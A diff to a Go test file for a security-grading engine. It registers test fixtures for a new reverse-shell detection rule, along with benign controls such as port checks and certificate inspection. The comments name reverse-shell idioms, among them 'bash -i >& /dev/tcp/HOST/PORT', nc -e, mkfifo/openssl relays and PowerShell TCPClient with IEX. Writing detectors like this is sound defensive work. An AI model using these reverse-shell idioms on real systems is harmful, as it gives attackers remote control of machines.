@@ -63,6 +63,49 @@ var adversarialCases = []adversarialCase{
 		why: "a command written in markdown inline code is still one command; backticks here are markup, not substitution"},
 	{dir: "control-redirect-to-file", axis: axes.Security, atMost: "A",
 		why: "redirection measured 25 benign findings against 2 malicious ones — vetoing it runs the wrong way"},
+
+	// --- SD-025 (reverse shell): the three canonical shapes moved out of
+	// uncoveredShapes below now that the rule detects them. ---
+	{dir: "revshell-dev-tcp", axis: axes.Security, atLeast: "F",
+		why: "SD-025 matches the /dev/tcp redirection bound to bash -i"},
+	{dir: "revshell-python", axis: axes.Security, atLeast: "F",
+		why: "SD-025 matches the inline python socket+pty payload"},
+	{dir: "revshell-perl", axis: axes.Security, atLeast: "F",
+		why: "SD-025 matches the inline perl Socket+exec payload"},
+
+	// --- SD-025 (reverse shell): new attack shapes beyond the three
+	// canonical spellings above, each a distinct socket+shell idiom. ---
+	{dir: "revshell-nc-e", axis: axes.Security, atLeast: "F",
+		why: "SD-025 matches nc -e binding a shell to the socket directly"},
+	{dir: "revshell-mkfifo-openssl", axis: axes.Security, atLeast: "F",
+		why: "SD-025 matches the mkfifo/openssl-s_client relay idiom"},
+	{dir: "revshell-powershell-tcpclient", axis: axes.Security, atLeast: "F",
+		why: "SD-025 matches a TCPClient socket paired with Invoke-Expression/IEX on the stream"},
+	{dir: "revshell-python-shell-true", axis: axes.Security, atLeast: "F",
+		why: "SD-025 matches a socket.socket() paired with subprocess shell=True on data read from it"},
+	{dir: "revshell-bash-i-devtcp", axis: axes.Security, atLeast: "F",
+		why: "SD-025 matches bash -i redirected to /dev/tcp"},
+
+	// --- SD-025 controls: connectivity/inspection idioms that share
+	// vocabulary with the attack shapes above but never bind a shell to the
+	// socket. Over-triggering here is the cost side of SD-025. ---
+	{dir: "control-port-check-devtcp", axis: axes.Security, atMost: "A",
+		why: "a bare `>` redirect into /dev/tcp is a port-open probe, not `>&` piping a shell's stdio onto the socket"},
+	{dir: "control-openssl-cert-inspect", axis: axes.Security, atMost: "A",
+		why: "openssl s_client here only feeds x509 for a certificate date check — no /bin/sh or sh -i follows it"},
+	// NOTE: this one is NOT clean. SD-007's reNetworkCommand matches any
+	// `nc `/`ncat `/`curl `/`wget ` invocation regardless of flags, and its
+	// declared-endpoint demotion only fires when the statement carries an
+	// http(s) URL (pkg/rules/exfiltration.go endpointFinding) — a bare
+	// `host port` argument list never does. So `nc -zv example.com 4444`
+	// grades D on security via SD-007, unrelated to SD-025 and not fixable
+	// without touching SD-007's independent demotion policy, which is out of
+	// scope here. Asserted honestly at the grade it actually earns; see the
+	// task report for the flag.
+	{dir: "control-nc-portscan", axis: axes.Security, atMost: "D",
+		why: "nc -zv never trips SD-025 (no -e, no shell); the D it earns is SD-007's unconditional nc-is-a-network-command match, which has no URL to demote on"},
+	{dir: "control-tcpclient-connectivity", axis: axes.Security, atMost: "A",
+		why: "a TCPClient.Connect/.Close connectivity check has no exec/IEX/shell=True anywhere in the file to pair with the socket"},
 }
 
 // uncoveredShapes are attacks NO rule in this engine detects. They are not
@@ -75,21 +118,12 @@ var adversarialCases = []adversarialCase{
 // case starts being detected — the signal to move it into adversarialCases
 // above with the grade it now earns.
 //
-// What is missing is a reverse-shell rule. `bash -i >& /dev/tcp/HOST/PORT`,
-// `python3 -c "import socket…pty.spawn"` and the perl `Socket`+`exec`
-// one-liner are the three canonical spellings, and SD-007 only ever saw them
-// because a URL happened to share the line. Adding that rule registers a new
-// ID and MOVES THE RULESET CHECKSUM, which is why it is not done here: the
-// checksum is pinned in three downstream places and moving it is a release
-// step, not a bugfix.
-var uncoveredShapes = []adversarialCase{
-	{dir: "revshell-dev-tcp", axis: axes.Security,
-		why: "no rule matches a /dev/tcp redirection"},
-	{dir: "revshell-python", axis: axes.Security,
-		why: "no rule matches an inline python socket+pty payload"},
-	{dir: "revshell-perl", axis: axes.Security,
-		why: "no rule matches an inline perl Socket+exec payload"},
-}
+// The reverse-shell gap this list used to record — `bash -i >& /dev/tcp/HOST/PORT`,
+// the python `socket…pty.spawn` one-liner, the perl `Socket`+`exec` one-liner —
+// is closed: SD-025 now detects all three (and more; see the revshell-* and
+// control-* entries in adversarialCases above). The list is empty until the
+// next shape this engine can't see is found and committed here.
+var uncoveredShapes = []adversarialCase{}
 
 func TestAdversarial_UncoveredShapes(t *testing.T) {
 	reg := rules.DefaultRegistry()
